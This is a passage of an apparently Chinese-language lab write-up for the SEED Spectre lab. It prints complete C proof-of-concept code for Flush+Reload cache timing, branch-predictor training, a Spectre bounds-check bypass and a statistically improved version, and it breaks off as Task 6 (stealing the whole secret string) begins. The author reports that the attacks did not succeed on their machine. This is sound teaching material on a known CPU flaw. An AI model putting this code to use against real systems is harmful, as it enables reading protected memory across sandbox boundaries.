class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">        time1 = __rdtscp(&amp;junk);</span><br><span class="line">        junk = *addr;</span><br><span class="line">        time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">        <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; size) &#123;  </span><br><span class="line">        temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA];  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FLUSH the probing array</span></span><br><span class="line">    flushSideChannel();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Train the CPU to take the true branch inside victim()</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;   </span><br><span class="line">        victim(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Exploit the out-of-order execution</span></span><br><span class="line">    _mm_clflush(&amp;size);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); </span><br><span class="line">    victim(<span class="number">97</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// RELOAD the probing array</span></span><br><span class="line">    reloadSideChannel();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里重要的一点是，如果想让分支进入一个指定的路径，我们需要训练CPU，这样我们指定的一个分支就会变成预测的结果</li><li>如果把下面这行语句注释掉，重新执行，会无法找出秘密值：</li><li>_mm_clflush(&amp;size);</li><li>执行这行语句是为了确保没有被CPU缓存</li><li>上面这行不注释，victim(i)改成victim(i+20)，也会失败，因为这样把CPU训练成不执行分支了<br><a name="cdRMd"></a></li></ul><h3 id="4-3-Task-3"><a href="#4-3-Task-3" class="headerlink" title="4.3 Task 3"></a><strong>4.3 Task 3</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o SpectreExperiment SpectreExperiment.c</span><br></pre></td></tr></table></figure><p>同理，不知是否是硬件原因，无法找出秘密值<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702475073401-dad6ed0a-b4bf-486f-8350-815abf4f8177.png#averageHue=%23080605&clientId=uf8fdb3e2-6fa1-4&from=paste&height=365&id=ua5c701b9&originHeight=575&originWidth=1047&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=132452&status=done&style=none&taskId=u82efbab1-98e0-4468-a2d8-d96132f4bc3&title=&width=664.7619349507802" alt="image.png"><br><a name="gFmvK"></a></p><h2 id="5-Task-4-The-Spectre-Attack"><a href="#5-Task-4-The-Spectre-Attack" class="headerlink" title="5 Task 4: The Spectre Attack"></a><strong>5 Task 4: The Spectre Attack</strong></h2><p><a name="Gka7H"></a></p><h3 id="5-1-The-Setup-for-the-Experiment"><a href="#5-1-The-Setup-for-the-Experiment" class="headerlink" title="5.1 The Setup for the Experiment"></a><strong>5.1 The Setup for the Experiment</strong></h3><ul><li>利用分支预测可以获取秘密值，秘密值可能是不同进程的数据，那是用硬件隔离机制来保护的。如果是同一个进程的数据， 往往利用软件的沙盒机制。获取不同进程的数据难度高很多，这里是演示在同一个进程中获取数据。</li><li>浏览器中不同页面是用不同沙盒隔离开的，幽灵漏洞可以获取另一个页面的数据。<br />SpectreAttack.c如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">char</span>    *secret    = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d(%c).\n&quot;</span>,i, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside restrictedAccess().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123; </span><br><span class="line">      restrictedAccess(i); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;   &#125;</span><br><span class="line">  <span class="comment">// Ask restrictedAccess() to return the secret in out-of-order execution. </span></span><br><span class="line">  s = restrictedAccess(index_beyond);  </span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)buffer);  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret: %p \n&quot;</span>, secret);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;buffer: %p \n&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index of secret (out of bound): %ld \n&quot;</span>, index_beyond);</span><br><span class="line">  spectreAttack(index_beyond);</span><br><span class="line">  reloadSideChannel();</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a name="Wzmse"></a></li></ul><h3 id="5-2-The-Program-Used-in-the-Experiment"><a href="#5-2-The-Program-Used-in-the-Experiment" class="headerlink" title="5.2 The Program Used in the Experiment"></a><strong>5.2 The Program Used in the Experiment</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o SpectreAttack SpectreAttack.c</span><br></pre></td></tr></table></figure><p>尝试了很多次，结果没有变化，无法打印出秘密值：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702524260152-b415476b-a4a8-4bd0-8629-e4836c310a8b.png#averageHue=%230f0c0a&clientId=u4568489d-13ea-4&from=paste&height=392&id=u6dd8ea2c&originHeight=618&originWidth=1062&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=184990&status=done&style=none&taskId=u60ed6623-e87f-48a5-b150-dff7f49cc67&title=&width=674.2857449070951" alt="image.png"><br />隐藏标题栏<br><a name="Dcffw"></a></p><h2 id="6-Task-5-Improve-the-Attack-Accuracy"><a href="#6-Task-5-Improve-the-Attack-Accuracy" class="headerlink" title="**6 Task 5: Improve the Attack Accuracy **"></a>**6 Task 5: Improve the Attack Accuracy **</h2><ul><li><p>在之前的任务中，可以观察到结果确实有一些噪声，而且结果并不总是准确的。这是因为CPU有时会在缓存中加载额外的值，期望在稍后使用，或者阈值不是很准确。缓存中的这个噪声会影响我们的攻击结果。我们需要多次执行攻击；我们可以使用以下代码来自动执行任务，而不是手动执行。我们基本上使用了一种统计技术。这个想法是创建一个大小为256的分数数组，每个可能的秘密值都有一个元素。然后，我们会多次进行攻击。每次，如果我们的攻击程序说k是秘密（这个结果可能是假的），我们加k。在多次攻击后，我们使用得分最高的值k作为对秘密的最终估计。这将产生一个比基于一次运行更可靠的估计。修改后的代码如下图所示:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">uint8_t</span> temp    = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>    *secret = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    restrictedAccess(i);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower); </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;  &#125;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)buffer);</span><br><span class="line"></span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****\n&quot;</span>);  <span class="comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">    spectreAttack(index_beyond);</span><br><span class="line">    usleep(<span class="number">10</span>);</span><br><span class="line">    reloadSideChannelImproved();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(scores[max] &lt; scores[i]) max = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The secret value is %d(%c)\n&quot;</span>, max, max);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>你的任务。请编译和运行幽灵攻击改进了。c，并执行以下任务：</p><ul><li>您可能会观察到，当运行上面的代码时，得分最高的代码很可能是得分[0]。请找出原因，并修复上面的代码，这样实际的秘密值（不是零值）将被打印出来。</li><li>Line➀似乎没用，但从我们对SEEDUbuntu20.04的经验来看，如果没有这条线，攻击就不会工作。在SEEDUbuntu16.04VM上，不需要使用这一行。我们还没有弄清楚确切的原因，所以如果可以的话，你的老师可能会给你额外积分。请上下运行该程序，并描述您的观察结果。</li><li>Line➁会使程序睡眠10微秒。该程序的睡眠时间确实会影响攻击的成功率。请尝试其他几点方法，并描述一下您的观察结果。</li></ul></li><li><p>编译运行</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702475681092-4f301b3d-6f70-477d-8c58-ab67dc873cc9.png#averageHue=%230b0907&clientId=uf8fdb3e2-6fa1-4&from=paste&height=135&id=SSJxE&originHeight=213&originWidth=1063&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=75254&status=done&style=none&taskId=u4946c5cf-6522-4599-9893-c3a012dc5a2&title=&width=674.9206655708495" alt="image.png"><br />可能是因为执行了很多次，最终还是失败了：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702475703037-d9b31134-62c5-4894-90de-26db7dc5679f.png#averageHue=%23030201&clientId=uf8fdb3e2-6fa1-4&from=paste&height=361&id=ax5Cs&originHeight=569&originWidth=547&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=26872&status=done&style=none&taskId=ud6f9a0bc-208c-4f78-8385-243e54677bb&title=&width=347.3016030736168" alt="image.png"></p><blockquote><p>因为我的实验一直无法成功，无法利用对照试验测试unsleep对实验结果的影响，根据某实验成功者的结论的实验结论：应该是因为usleep的时间最长，预测执行时间相关，array[s*4096 + DELTA] +&#x3D; 88;没能执行，容易导致scores[0]</p></blockquote><p><a name="paGo4"></a></p><h2 id="7-Task-6-Steal-the-Entire-Secret-String"><a href="#7-Task-6-Steal-the-Entire-Secret-String" class="headerlink" title="7 Task 6: Steal the Entire Secret String"></a><strong>7 Task 6: Steal the Entire Secret String</strong></h2><blockquote><p>在上一个任务中，我们只读取秘密字符串的第一个字符。在这个任务中，我们需要使用幽灵攻击打印出整个字符串。请编写您自己的代码或扩展任务5中的代码；在报告中包括您的执行结果。</p></blockquote><p>将SpectreAttackImproved.c修改如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 